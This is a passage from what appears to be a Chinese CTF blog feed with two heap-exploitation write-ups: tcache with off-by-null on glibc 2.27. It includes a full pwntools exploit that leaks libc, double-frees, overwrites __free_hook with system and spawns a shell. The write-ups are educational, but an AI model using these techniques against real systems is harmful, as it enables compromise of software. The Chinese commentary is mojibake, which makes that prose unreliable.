<pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment">#å †å‘å‰åˆå¹¶æ‰åºå·ä¸º8çš„chunk</span>
add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#è¿™ä¸¤ä¸ªchunkçš„å¤§å°åŠ èµ·æ¥æ­£å¥½ç­‰äºåºå·ä¸º7çš„chunk</span>
add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#æ­¤chunkçš„å¤§å°å¿…é¡»ä¸ºå±äºåºå·ä¸º8çš„chunkçš„å¤§å°</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>showåºå·ä¸º8çš„chunkå°±å¯ä»¥å¾—åˆ°unsortbins_addr,</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>

leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

__malloc_hook <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span><span class="token operator">-</span><span class="token number">0x10</span>

libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span><span class="token number">0x23</span>

free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"free_hook  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"system  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æ—¥å¿—ç»“æœ</p>
<p><img src="https://s2.loli.net/2024/08/19/cL6yFxEtOrzM3CY.png" alt="7dbea093fbc443228769956bf6cbbf34.png"></p>
<p>æ­¤æ—¶æƒ³åŠæ³•å°†free_hookä¿®æ”¹ä¸ºsystemã€‚å°†å †é‡å çš„é‚£å—åŒºåŸŸç»™ç”³è¯·å‡ºæ¥ã€‚è¿™æ ·å°±å¯ä»¥æ„æˆdouble free</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"> add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment">#åˆ†å‰²unsortbinsçš„å¤§å°ã€‚å…¶å®æ˜¯ä¸ºäº†è®©åºå·ä¸º8çš„é‚£å—chunkå½’æˆ‘æ‰€ç”¨</span>

delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment">#double free</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æŸ¥çœ‹binsï¼Œå¯ä»¥çœ‹åˆ°å¤§å°ä¸º0x20çš„å½¢æˆäº†åŒé“¾ç»“æ„</p>
<p><img src="https://s2.loli.net/2024/08/19/jxwfcJGbgS4LvXz.png" alt="e519e95e57584651bf7ea54c756a17a4.png"></p>
<p>æœ€åå°±æ˜¯æ­£å¸¸çš„æ­¥éª¤</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#å°†å…¶çš„fdæŒ‡é’ˆæŒ‡å‘free_hook</span>

add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#å°†0x55cd056ba60çš„chunkç”³è¯·æ‰</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#å°†__free_hookä¿®æ”¹ä¸ºsystemçš„åœ°å€</span>

delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æœ€ågetshell</p>
<p><img src="https://s2.loli.net/2024/08/19/VEUiIOgPv9RsjBe.png" alt="63a402e8a92c4c8bb7875c0f89f2b552.png"></p>
<h5 id="æœ€åå®Œæ•´çš„exp"><a href="#æœ€åå®Œæ•´çš„exp" class="headerlink" title="æœ€åå®Œæ•´çš„exp"></a>æœ€åå®Œæ•´çš„exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>index<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your Choice:'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content'</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your Choice:'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your Choice:'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token string">'AAAA'</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#æ­¤chunkéœ€è¦å’Œå‰é¢çš„chunkå¤§å°ä¿æŒä¸€ç›´</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#æ­¤chunkçš„å¤§å°è‡³å°‘ä¸º0xf0ï¼Œå› ä¸ºoff-by-nullä¼šå°†ä½ä½ä¿®æ”¹ä¸º0ã€‚</span>
    add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    
    delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#åˆ¶é€ å‡chunkå¤´ï¼Œ0x120ä¸ºå‰é¢åºå·ä¸º7å’Œ8çš„chunkå¤§å°å’Œï¼ŒæŠŠ        åºå·ä¸º9çš„chunkçš„pre_sizeä½ä¿®æ”¹ä¸º0x100</span>

    delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment">#å †å‘å‰åˆå¹¶æ‰åºå·ä¸º8çš„chunk</span>
    add<span class="token punctuation">(</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#è¿™ä¸¤ä¸ªchunkçš„å¤§å°åŠ èµ·æ¥æ­£å¥½ç­‰äºåºå·ä¸º7çš„chunk</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token comment">#æ­¤chunkçš„å¤§å°å¿…é¡»ä¸ºå±äºåºå·ä¸º8çš„chunkçš„å¤§å°</span>

    show<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>

    leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"leak_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    __malloc_hook <span class="token operator">=</span> leak_addr <span class="token operator">-</span> <span class="token number">0x60</span><span class="token operator">-</span><span class="token number">0x10</span>
    
    libc_base <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    fake_chunk <span class="token operator">=</span> __malloc_hook <span class="token operator">-</span><span class="token number">0x23</span>

    free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"free_hook  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"system  = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment">#åˆ†å‰²unsortbinsçš„å¤§å°ã€‚å…¶å®æ˜¯ä¸ºäº†è®©åºå·ä¸º8çš„é‚£å—chunkå½’æˆ‘æ‰€ç”¨</span>

    delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token comment">#double free</span>

    add<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#å°†å…¶çš„fdæŒ‡é’ˆæŒ‡å‘free_hook</span>

    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment">#å°†0x55cd056ba60çš„chunkç”³è¯·æ‰</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#å°†__free_hookä¿®æ”¹ä¸ºsystemçš„åœ°å€</span>

    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
 
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>  

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>tcache</tag>
        <tag>é«˜libc</tag>
      </tags>
  </entry>
  <entry>
    <title>é«˜ç‰ˆæœ¬Tcache+off-by-Oneï¼ˆäºŒï¼‰</title>
    <url>/2024/07/25/%E9%AB%98%E7%89%88%E6%9C%ACtcache-off-by-one%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h5 id="ç¨‹åºçš„ä¿æŠ¤"><a href="#ç¨‹åºçš„ä¿æŠ¤" class="headerlink" title="ç¨‹åºçš„ä¿æŠ¤"></a>ç¨‹åºçš„ä¿æŠ¤</h5><p>æ„Ÿè§‰åŸºæœ¬çš„å¤§éƒ¨åˆ†çš„heapé¢˜ç›®éƒ½æ˜¯å…¨éƒ¨å¼€çš„ã€‚æœ‰æ—¶å€™è¦æ˜¯ä»–å°‘äº†ä¸ªä¿æŠ¤ï¼Œæˆ‘éƒ½ä¼šæ„Ÿè§‰è¿™é¢˜éš¾åˆ°é£èµ·ã€‚è¿™é¢˜æ˜¯18.04çš„ç¯å¢ƒä¹Ÿå°±æ˜¯2.27ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/9mhqbnyewgPORpu.png" alt="f058a21f6cbe4a6ea67f97e142c4484f.png"></p>
<h5 id="åˆ†æä¼ªcå‡½æ•°"><a href="#åˆ†æä¼ªcå‡½æ•°" class="headerlink" title="åˆ†æä¼ªcå‡½æ•°"></a>åˆ†æä¼ªcå‡½æ•°</h5><p>mainå‡½æ•°å°±æ˜¯æ­£å¸¸çš„èœå•é¢˜ï¼Œä½†æ˜¯æ²¡æœ‰editå‡½æ•°è¿™å°±å¾ˆçƒ¦äººã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/wjLp4JHD13o9GKN.png" alt="7431b927b42e40b8ac9e7cb268286b08.png"></p>
<p>deleteå‡½æ•°ï¼Œæˆ‘åªèƒ½è¯´å®ƒåˆ çš„å¾ˆå¹²å‡€ï¼Œä¸€ç‚¹ä¸ç»™æˆ‘æœºä¼šï¼ˆuafï¼‰</p>
<p><img src="https://s2.loli.net/2024/08/19/mP9kM5xFfiQOGIq.png" alt="1e15a6829cdf40eab5ed7e2d90958a82.png"></p>
<p>showå‡½æ•°ä¹Ÿå¾ˆæ­£å¸¸å§ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/nHTBOP8Rayt3hjr.png" alt="90571b06f75c43019439410765c68c1c.png"></p>
<p>addå‡½æ•°é‡Œé¢çš„sub_BC8()å’Œcallocå€¼å¾—æˆ‘ä»¬æ³¨æ„ä¸€ä¸‹ï¼Œä¸”ç”³è¯·çš„chunkå¤§å°ä¸èƒ½å¤§äº0x100</p>
<p><img src="https://s2.loli.net/2024/08/19/f7hGrczRO5jYwAx.png" alt="ab2d9a45d8ba4a569bfd9d9cb0ac6fc0.png"></p>
<p>sub_BC8å‡½æ•°æ˜¯å†™å…¥å‡½æ•°ã€‚ä½†æ˜¯å‘¢ï¼Œå­˜åœ¨off-by-null</p>
<p><img src="https://s2.loli.net/2024/08/19/2YXtqQEZP6aHjeB.png" alt="0a4e27df127d4b559895f39668fc45e4.png"></p>
<p>ä¸‹é¢è¯´è¯´é‚£ä¸ªcalloc(v0, 1uLL)ï¼Œè®°å¾—callocä¸ä¼šä»tcacheä¸­å¯»æ‰¾åˆé€‚çš„åˆ†é…ï¼Œåªä¼šä»fast bin,small bin, unsorted binæ¥åˆ†é…å°±è¡Œã€‚</p>
<h5 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h5><p>åˆ©ç”¨é‚£ä¸ªoff-by-nullå°†å †é‡å ï¼Œé€šè¿‡unsortbinsä»è€Œæ³„éœ²libcåœ°å€ã€‚åé¢å°†chunkç”³è¯·åˆ°__malloc_hookä¸Šé¢çš„æ–¹æ³•ä¼¼ä¹æˆ‘æ˜¯ä¸€æ­¥æ­¥è°ƒè¯•å‡ºæ¥çš„ï¼Œä¸ç®—å…·ä½“ä»€ä¹ˆæ–¹æ³•ã€‚åº”è¯¥å±äºå †é£æ°´ï¼ˆéšç¼˜æ‰“æ³•ï¼‰ä½†æ˜¯æˆåŠŸäº†ã€‚</p>
<h5 id="åˆ†ææ€è·¯"><a href="#åˆ†ææ€è·¯" class="headerlink" title="åˆ†ææ€è·¯"></a>åˆ†ææ€è·¯</h5><p>1ï¼Œä¸‡äº‹å¼€å¤´éš¾ï¼Œç¬¬ä¸€æ­¥æˆ‘å½“æ—¶ä¹Ÿæ²¡æå¯¹ã€‚ä½†æ˜¯å§ï¼Œé«˜ç‰ˆæœ¬libcæœ‰tcacheä¸€èˆ¬éƒ½æ˜¯åé¢æ…¢æ…¢è°ƒè¯•æ›´æ”¹çš„ã€‚å…ˆå°†åé¢ä¼šåˆ©ç”¨åˆ°çš„ä¸€å®šsizeçš„chunkå¯¹åº”çš„Tcacheç»™å¡«æ»¡ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token comment">#0-6</span>
    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#7-13</span>
    add<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#14 - 20</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">)</span><span class="token comment">#21 - 27</span>

add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#28</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment">#29</span>
add<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span><span class="token comment">#30</span>
add<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">'dddd'</span><span class="token punctuation">)</span><span class="token comment">#31</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment">#0-27è¢«freeæ‰äº†</span>
<span class="token comment">#å°†ä¸Šé¢å°†å¯¹åº”å¤§å°çš„tcacheå¡«æ»¡</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>æ­¤æ—¶çš„bins</p>
<p><img src="https://s2.loli.net/2024/08/19/fnQSkxe4JmawHZC.png" alt="488481879b4a4cecb6ab8e944bde0af7.png"></p>
<p>2ï¼Œå…ˆå°†åºå·ä¸º28å’Œ29çš„chunkç»™freeæ‰ï¼Œå†ç”³è¯·å›æ¥åºå·ä¸º29çš„chunkï¼ˆå› ä¸ºå…ˆè¿›åå‡ºï¼‰å°†åºå·ä¸º30çš„pre_sizeä½ä¿®æ”¹ä¸º0x120ï¼ˆä¸ºåºå·28å’Œ29çš„sizeå’Œï¼‰ï¼Œå†é€šè¿‡off-by-oneæ¼æ´ï¼Œå°†åºå·ä¸º30çš„sizeçš„ä½ä¸€å­—èŠ‚æ”¹ä¸ºâ€\x00â€ï¼Œå†å°†å…¶freeæ‰å°±ä¼šé€ æˆå †é‡å ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">29</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x120</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#0</span>
free<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>ä¿®æ”¹pre_sizeå’Œsizeä½ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/h58xsDEa7zwgG91.png" alt="e6557ee188ff4dbc8364a8fb8f506b9a.png"></p>
<p>æ­¤æ—¶å› ä¸ºfreeæœºåˆ¶ï¼Œå°±ä¼šå°†è¿™ä¸‰ä¸ªchunkåˆå¹¶freeæ‰ï¼Œæ€»çš„sizeä¸º0x220ä¸ºè¿™ä¸‰ä¸ªçš„å’Œ</p>
<p><img src="https://s2.loli.net/2024/08/19/WfIiaoHQ7hw89LV.png" alt="d32b5e0b76654c7f9e8d69de434cd462.png"></p>
<p>3ï¼Œæ­¤æ—¶è¿™ä¸ªå¤§çš„freechunkæ˜¯å†unsortbinsé‡Œé¢çš„ï¼ˆå› ä¸ºtcacheé‡Œé¢é‚£ä¸‰ä¸ªå°chunkå¯¹åº”çš„sizeå·²ç»è¢«å¡«æ»¡äº†ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å†å°†å‰é¢çš„åºå·ä¸º28çš„chunkç»™ç”³è¯·å›æ¥ã€‚å› ä¸ºç¨‹åºä½¿ç”¨çš„æ˜¯callocä¸ä¼šè°ƒç”¨tcacheé‡Œé¢çš„chunkï¼Œåˆå› ä¸ºunsortbinsé‡Œé¢æœ‰chunkä¸”å¤§å°å¤Ÿæ‰€ä»¥ä»ä¸­åˆ‡å‰²ï¼Œä¸ç„¶ä»top_chunké‡Œé¢åˆ‡å‰²ã€‚ä¹‹åå°±ä¼šå‘ç°ä¹‹å‰æ‰€è¦†ç›–çš„chunké‡Œé¢è¢«å†™ä¸Šäº†unsortbins_addrï¼Œæ¥ä¸‹æ¥showä¸€ä¸‹ï¼Œå°±ä¼šæ³„éœ²ä¿¡æ¯</p>
